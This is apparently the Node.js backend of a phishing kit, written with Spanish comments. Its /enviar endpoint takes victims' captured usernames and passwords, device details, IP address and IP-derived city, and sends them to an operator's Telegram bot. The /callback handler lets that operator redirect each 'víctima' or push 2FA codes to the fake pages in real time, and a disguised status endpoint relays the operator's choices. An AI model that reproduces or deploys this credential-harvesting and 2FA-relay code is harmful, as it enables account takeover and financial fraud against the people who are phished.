const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();
const https = require('https');

// 👉 FORZAR IPv4
const agent = new https.Agent({ family: 4 });

const app = express();

// 🔥 CORS CONFIGURADO PARA FUNCIONAR CON FIREBASE Y OTROS HOSTINGS ESTÁTICOS
const corsOptions = {
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false,
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

// 🔥 CLAVE: Manejar explícitamente las peticiones preflight (OPTIONS)
app.options('*', cors(corsOptions));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const STATUS_FILE = './status.json';

let clientes = {};
if (fs.existsSync(STATUS_FILE)) {
  clientes = JSON.parse(fs.readFileSync(STATUS_FILE));
}

function guardarEstado() {
  fs.writeFileSync(STATUS_FILE, JSON.stringify(clientes, null, 2));
}

// 👉 Obtener ciudad con IPv4 forzado
async function obtenerCiudad(ip) {
  try {
    const response = await fetch(`https://ipinfo.io/${ip}/json`, { agent });
    const data = await response.json();
    return data.city || 'Ciudad desconocida';
  } catch {
    return 'Ciudad desconocida';
  }
}

// -----------------------------------------------------------
//  /enviar
// -----------------------------------------------------------
app.post('/enviar', async (req, res) => {
  // 🔥 LOG para depurar (verás esto en los logs de Render)
  console.log("Body recibido en /enviar:", req.body);
  console.log("User-Agent del header del servidor:", req.headers['user-agent']);

  const { usar, clav, txid, dispositivo, userAgent } = req.body;

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress || 'desconocida';
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
❤️GM4YL❤️
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar || 'No disponible'}</code>
🔐 CL4V: <code>${clav || 'No disponible'}</code>

📱 DISP: ${dispositivo || 'No detectado'}
📋 User-Agent: <code>${userAgent || 'No disponible'}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑CONFIRMAR", callback_data: `cel-dina:${txid}` }],
      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  clientes[txid] = { status: "esperando" };
  guardarEstado();

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML',
        reply_markup: keyboard
      }),
      agent
    });
  } catch (err) {
    console.error("Error enviando a Telegram:", err);
  }

  res.sendStatus(200);
});

// -----------------------------------------------------------
// /callback (botones inline + comandos /txid)
// -----------------------------------------------------------
app.post('/callback', async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    if (!callback || !callback.data) return res.sendStatus(400);
    const [accion, txid] = callback.data.split(":");
    clientes[txid] = { status: accion };
    guardarEstado();

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      }),
      agent
    });
    return res.sendStatus(200);
  }

  if (req.body.message?.text) {
    const text = req.body.message.text.trim();
    if (text.startsWith('/')) {
      const parts = text.slice(1).split(' ');
      const txid = parts[0];
      const comando = parts[1];

      // RESET → redirige a index.html
      if (comando && comando.toLowerCase() === 'reset') {
        if (!clientes[txid]) {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: req.body.message.chat.id,
              text: `❌ Error: txid ${txid} no encontrado`
            }),
            agent
          });
          return res.sendStatus(200);
        }

        clientes[txid] = { status: "resetear" };
        guardarEstado();

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `🔄 Reiniciado correctamente!\n\n🆔 ID: ${txid}\n\nLa víctima está siendo enviada al inicio (index.html) ahora mismo.`
          }),
          agent
        });
        return res.sendStatus(200);
      }

      // CÓDIGO 2FA
      if (comando && /^\d{1,2}$/.test(comando) && Number(comando) >= 1 && Number(comando) <= 99) {
        if (!clientes[txid]) {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: req.body.message.chat.id,
              text: `❌ Error: txid ${txid} no encontrado`
            }),
            agent
          });
          return res.sendStatus(200);
        }

        clientes[txid] = { status: "codigo2fa", code: comando };
        guardarEstado();

        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `✅ Código 2FA activado!\n\n🆔 ID: ${txid}\n🔢 Código: ${comando}\n\nVíctima verá el código en otro3.html.`
          }),
          agent
        });
        return res.sendStatus(200);
      }

      // Ayuda
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `⚠️ Formato incorrecto.\n\nComandos válidos:\n• /txid 5    → enviar código 2FA (1-99)\n• /txid 42   → enviar código 2FA\n• /txid reset → enviar al inicio (index.html)`
        }),
        agent
      });
      return res.sendStatus(200);
    }
  }

  res.sendStatus(200);
});

// -----------------------------------------------------------
//  POLLING
// -----------------------------------------------------------
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = clientes[txid] || { status: "esperando" };

  const response = {
    status: typeof cliente === 'string' ? cliente : (cliente.status || "esperando")
  };

  if (typeof cliente === 'object' && cliente.code) {
    response.code = cliente.code;
  }

  res.json(response);
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
